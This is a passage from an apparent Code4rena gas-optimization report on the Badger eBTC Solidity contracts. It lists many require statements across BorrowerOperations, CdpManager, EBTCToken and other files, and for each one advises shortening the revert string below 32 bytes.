463    require(vars.netStEthBalance > 0, "BorrowerOperations: zero collateral for openCdp()!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L463](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L463)


#

```
File: contracts/BorrowerOperations.sol

541    require(
542                vars.netStEthBalance + LIQUIDATOR_REWARD == _stEthBalance,
543                "BorrowerOperations: deposited collateral mismatch!"
544            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L541-L544](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L541-L544)


#

```
File: contracts/BorrowerOperations.sol

715    require(_deadline >= block.timestamp, "BorrowerOperations: Position manager permit expired")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L715](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L715)


#

```
File: contracts/BorrowerOperations.sol

734    require(
735                recoveredAddress != address(0) && recoveredAddress == _borrower,
736                "BorrowerOperations: Invalid signature"
737            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L734-L737](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L734-L737)


#

```
File: contracts/BorrowerOperations.sol

807    require(
808                _stEthBalanceIncrease == 0 || _stEthBalanceDecrease == 0,
809                "BorrowerOperations: Cannot add and withdraw collateral in same operation"
810            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L807-L810](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L807-L810)


#

```
File: contracts/BorrowerOperations.sol

818    require(
819                _stEthBalanceIncrease != 0 || _stEthBalanceDecrease != 0 || _debtChange != 0,
820                "BorrowerOperations: There must be either a collateral change or a debt change"
821            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L818-L821](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L818-L821)


#

```
File: contracts/BorrowerOperations.sol

826    require(status == 1, "BorrowerOperations: Cdp does not exist or is closed")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L826](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L826)


#

```
File: contracts/BorrowerOperations.sol

831    require(status == 0, "BorrowerOperations: Cdp is active or has been previously closed")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L831](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L831)


#

```
File: contracts/BorrowerOperations.sol

835    require(_debtChange > 0, "BorrowerOperations: Debt increase requires non-zero debtChange")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L835](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L835)


#

```
File: contracts/BorrowerOperations.sol

839    require(
840                !_checkRecoveryModeForTCR(_tcr),
841                "BorrowerOperations: Operation not permitted during Recovery Mode"
842            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L839-L842](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L839-L842)


#

```
File: contracts/BorrowerOperations.sol

846    require(
847                _stEthBalanceDecrease == 0,
848                "BorrowerOperations: Collateral withdrawal not permitted during Recovery Mode"
849            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L846-L849](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L846-L849)


#

```
File: contracts/BorrowerOperations.sol

911    require(
912                _newICR >= MCR,
913                "BorrowerOperations: An operation that would result in ICR < MCR is not permitted"
914            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L911-L914](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L911-L914)


#

```
File: contracts/BorrowerOperations.sol

918    require(_newICR >= CCR, "BorrowerOperations: Operation must leave cdp with ICR >= CCR")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L918](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L918)


#

```
File: contracts/BorrowerOperations.sol

922    require(
923                _newICR >= _oldICR,
924                "BorrowerOperations: Cannot decrease your Cdp's ICR in Recovery Mode"
925            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L922-L925](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L922-L925)


#

```
File: contracts/BorrowerOperations.sol

929    require(
930                _newTCR >= CCR,
931                "BorrowerOperations: An operation that would result in TCR < CCR is not permitted"
932            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L929-L932](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L929-L932)


#

```
File: contracts/BorrowerOperations.sol

936    require(_debt > 0, "BorrowerOperations: Debt must be non-zero")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L936](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L936)


#

```
File: contracts/BorrowerOperations.sol

940    require(
941                _stEthBalance >= MIN_NET_STETH_BALANCE,
942                "BorrowerOperations: Cdp's net stEth balance must not fall below minimum"
943            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L940-L943](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L940-L943)


#

```
File: contracts/BorrowerOperations.sol

947    require(
948                _debtRepayment <= _currentDebt,
949                "BorrowerOperations: Amount repaid must not be larger than the Cdp's debt"
950            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L947-L950](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L947-L950)


#

```
File: contracts/BorrowerOperations.sol

957    require(
958                ebtcToken.balanceOf(_account) >= _debtRepayment,
959                "BorrowerOperations: Caller doesnt have enough eBTC to make repayment"
960            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L957-L960](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L957-L960)


#

```
File: contracts/BorrowerOperations.sol

970    require(
971                _approval != PositionManagerApproval.None,
972                "BorrowerOperations: Only borrower account or approved position manager can OpenCdp on borrower's behalf"
973            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L970-L973](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L970-L973)


#

```
File: contracts/BorrowerOperations.sol

1116    require(!flashLoansPaused, "BorrowerOperations: Flash Loans Paused")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1116](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1116)


#

```
File: contracts/BorrowerOperations.sol

1141    require(
1142                _feeRecipientAddress != address(0),
1143                "BorrowerOperations: Cannot set feeRecipient to zero address"
1144            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1141-L1144](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1141-L1144)


#

```
File: contracts/BorrowerOperations.sol

1155    require(_newFee <= MAX_FEE_BPS, "ERC3156FlashLender: _newFee should <= MAX_FEE_BPS")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1155](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1155)


#

```
File: contracts/BorrowerOperations.sol

145    require(locked == OPEN, "BorrowerOperations: Reentrancy in nonReentrant call")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L145](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L145)


#

```
File: contracts/BorrowerOperations.sol

146    require(
147                ReentrancyGuard(address(cdpManager)).locked() == OPEN,
148                "CdpManager: Reentrancy in nonReentrant call"
149            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L146-L149](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L146-L149)


#

```
File: contracts/CdpManager.sol

431    require(totals.collSharesDrawn > 0, "CdpManager: Unable to redeem any amount")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L431](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L431)


#

```
File: contracts/CdpManager.sol

502    require(_toRemoveIds[0] == _start, "CdpManager: batchRemoveSortedCdpIds check start error")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L502](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L502)


#

```
File: contracts/CdpManager.sol

503    require(
504                _toRemoveIds[_total - 1] == _end,
505                "CdpManager: batchRemoveSortedCdpIds check end error"
506            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L503-L506](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L503-L506)


#

```
File: contracts/CdpManager.sol

626    require(newBaseRate > 0, "CdpManager: new baseRate is zero!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L626](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L626)


#

```
File: contracts/CdpManager.sol

672    require(redemptionFee < _ETHDrawn, "CdpManager: Fee would eat up all returned collateral")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L672](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L672)


#

```
File: contracts/CdpManager.sol

743    require(
744                callerBalance >= _amount,
745                "CdpManager: Requested redemption amount must be <= user's EBTC token balance"
746            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L743-L746](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L743-L746)


#

```
File: contracts/CdpManager.sol

747    require(
748                callerBalance <= _totalSupply,
749                "CdpManager: redeemer's EBTC balance exceeds total supply!"
750            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L747-L750](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L747-L750)


#

```
File: contracts/CdpManager.sol

754    require(_amount > 0, "CdpManager: Amount must be greater than zero")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L754](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L754)


#

```
File: contracts/CdpManager.sol

758    require(_TCR >= MCR, "CdpManager: Cannot redeem when TCR < MCR")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L758](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L758)


#

```
File: contracts/CdpManager.sol

762    require(
763                _maxFeePercentage >= redemptionFeeFloor && _maxFeePercentage <= DECIMAL_PRECISION,
764                "Max fee percentage must be between redemption fee floor and 100%"
765            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765)


#

```
File: contracts/CdpManager.sol

774    require(
775                _stakingRewardSplit <= MAX_REWARD_SPLIT,
776                "CDPManager: new staking reward split exceeds max"
777            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L774-L777](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L774-L777)


#

```
File: contracts/CdpManager.sol

789    require(
790                _redemptionFeeFloor >= MIN_REDEMPTION_FEE_FLOOR,
791                "CDPManager: new redemption fee floor is lower than minimum"
792            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L789-L792](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L789-L792)


#

```
File: contracts/CdpManager.sol

793    require(
794                _redemptionFeeFloor <= DECIMAL_PRECISION,
795                "CDPManager: new redemption fee floor is higher than maximum"
796            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L793-L796](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L793-L796)


#

```
File: contracts/CdpManager.sol

808    require(
809                _minuteDecayFactor >= MIN_MINUTE_DECAY_FACTOR,
810                "CDPManager: new minute decay factor out of range"
811            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L808-L811](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L808-L811)


#

```
File: contracts/CdpManager.sol

812    require(
813                _minuteDecayFactor <= MAX_MINUTE_DECAY_FACTOR,
814                "CDPManager: new minute decay factor out of range"
815            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L812-L815](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L812-L815)


#

```
File: contracts/CdpManagerStorage.sol

112    require(
113                _gracePeriod >= MINIMUM_GRACE_PERIOD,
114                "CdpManager: Grace period below minimum duration"
115            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L112-L115](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L112-L115)


#

```
File: contracts/CdpManagerStorage.sol

261    require(
262                closedStatus != Status.nonExistent && closedStatus != Status.active,
263                "CdpManagerStorage: close non-exist or non-active CDP!"
264            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L261-L264](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L261-L264)


#

```
File: contracts/CdpManagerStorage.sol

453    require(totalStakesSnapshot > 0, "CdpManagerStorage: zero totalStakesSnapshot!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L453](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L453)


#

```
File: contracts/CdpManagerStorage.sol

466    require(
467                cdpStatus != Status.nonExistent && cdpStatus != Status.active,
468                "CdpManagerStorage: remove non-exist or non-active CDP!"
469            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L466-L469](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L466-L469)


#

```
File: contracts/CdpManagerStorage.sol

475    require(index <= idxLast, "CdpManagerStorage: CDP indexing overflow!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L475](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L475)


#

```
File: contracts/CdpManagerStorage.sol

556    require(_newIndex > _prevIndex, "CDPManager: only take fee with bigger new index")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L556](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L556)


#

```
File: contracts/CdpManagerStorage.sol

649    require(Cdps[_cdpId].status == Status.active, "CdpManager: Cdp does not exist or is closed")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L649](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L649)


#

```
File: contracts/CdpManagerStorage.sol

653    require(
654                CdpOwnersArrayLength > 1 && sortedCdps.getSize() > 1,
655                "CdpManager: Only one cdp in the system"
656            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L653-L656](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L653-L656)


#

```
File: contracts/CdpManagerStorage.sol

660    require(
661                msg.sender == borrowerOperationsAddress,
662                "CdpManager: Caller is not the BorrowerOperations contract"
663            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L660-L663](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L660-L663)


#

```
File: contracts/CdpManagerStorage.sol

242    require(locked == OPEN, "CdpManager: Reentrancy in nonReentrant call")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L242](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L242)


#

```
File: contracts/CdpManagerStorage.sol

243    require(
244                ReentrancyGuard(borrowerOperationsAddress).locked() == OPEN,
245                "BorrowerOperations: Reentrancy in nonReentrant call"
246            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L243-L246](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L243-L246)


#

```
File: contracts/CollSurplusPool.sol

92    require(claimableColl > 0, "CollSurplusPool: No collateral available to claim")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L92](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L92)


#

```
File: contracts/CollSurplusPool.sol

113    require(
114                msg.sender == borrowerOperationsAddress,
115                "CollSurplusPool: Caller is not Borrower Operations"
116            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L113-L116](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L113-L116)


#

```
File: contracts/CollSurplusPool.sol

120    require(msg.sender == cdpManagerAddress, "CollSurplusPool: Caller is not CdpManager")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L120](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L120)


#

```
File: contracts/CollSurplusPool.sol

124    require(msg.sender == activePoolAddress, "CollSurplusPool: Caller is not Active Pool")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L124](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L124)


#

```
File: contracts/CollSurplusPool.sol

143    require(token != address(collateral), "CollSurplusPool: Cannot Sweep Collateral")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L143](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L143)


#

```
File: contracts/CollSurplusPool.sol

146    require(amount <= balance, "CollSurplusPool: Attempt to sweep more than balance")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L146](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L146)


#

```
File: contracts/EBTCToken.sol

144    require(cachedAllowance >= amount, "ERC20: transfer amount exceeds allowance")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L144](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L144)


#

```
File: contracts/EBTCToken.sol

165    require(cachedAllowances >= subtractedValue, "ERC20: decreased allowance below zero")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L165](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L165)


#

```
File: contracts/EBTCToken.sol

251    require(cachedSenderBalances >= amount, "ERC20: transfer amount exceeds balance")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L251](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L251)


#

```
File: contracts/EBTCToken.sol

263    require(account != address(0), "EBTCToken: mint to zero recipient!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L263](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L263)


#

```
File: contracts/EBTCToken.sol

271    require(account != address(0), "EBTCToken: burn from zero account!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L271](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L271)


#

```
File: contracts/EBTCToken.sol

274    require(cachedBalance >= amount, "ERC20: burn amount exceeds balance")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L274](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L274)


#

```
File: contracts/EBTCToken.sol

296    require(
297                _recipient != address(0) && _recipient != address(this),
298                "EBTC: Cannot transfer tokens directly to the EBTC token contract or the zero address"
299            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L296-L299](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L296-L299)


#

```
File: contracts/EBTCToken.sol

300    require(
301                _recipient != cdpManagerAddress && _recipient != borrowerOperationsAddress,
302                "EBTC: Cannot transfer tokens directly to the CdpManager or BorrowerOps"
303            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L300-L303](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L300-L303)


#

```
File: contracts/EBTCToken.sol

307    require(
308                msg.sender == borrowerOperationsAddress,
309                "EBTCToken: Caller is not BorrowerOperations"
310            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L307-L310](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L307-L310)


#

```
File: contracts/EBTCToken.sol

315    require(
316                msg.sender == borrowerOperationsAddress ||
317                    msg.sender == cdpManagerAddress ||
318                    isAuthorized(msg.sender, msg.sig),
319                "EBTC: Caller is neither BorrowerOperations nor CdpManager nor authorized"
320            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L315-L320](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L315-L320)


#

```
File: contracts/LeverageMacroBase.sol

179    require(
180                    cdpInfo.status == checkParams.expectedStatus,
181                    "!LeverageMacroReference: openCDP status check"
182                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L179-L182](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L179-L182)


#

```
File: contracts/LeverageMacroBase.sol

191    require(
192                    cdpInfo.status == checkParams.expectedStatus,
193                    "!LeverageMacroReference: adjustCDP status check"
194                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L191-L194](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L191-L194)


#

```
File: contracts/LeverageMacroBase.sol

201    require(
202                    cdpInfo.status == checkParams.expectedStatus,
203                    "!LeverageMacroReference: closeCDP status check"
204                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L201-L204](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L201-L204)


#

```
File: contracts/LeverageMacroBase.sol

249    require(check.value >= valueToCheck, "!LeverageMacroReference: gte post check")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L249](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L249)


#

```
File: contracts/LeverageMacroBase.sol

251    require(check.value <= valueToCheck, "!LeverageMacroReference: let post check")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L251](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L251)


#

```
File: contracts/LeverageMacroBase.sol

253    require(check.value == valueToCheck, "!LeverageMacroReference: equal post check")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L253](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L253)


#

```
File: contracts/LeverageMacroBase.sol

352    require(initiator == address(this), "LeverageMacroReference: wrong initiator for flashloan")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L352](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L352)


#

```
File: contracts/LeverageMacroBase.sol

356    require(
357                    msg.sender == address(borrowerOperations),
358                    "LeverageMacroReference: wrong lender for eBTC flashloan"
359                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L356-L359](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L356-L359)


#

```
File: contracts/LeverageMacroBase.sol

362    require(
363                    msg.sender == address(activePool),
364                    "LeverageMacroReference: wrong lender for stETH flashloan"
365                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L362-L365](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L362-L365)


#

```
File: contracts/LeverageMacroBase.sol

440    require(
441                        IERC20(swapChecks[i].tokenToCheck).balanceOf(address(this)) >
442                            swapChecks[i].expectedMinOut,
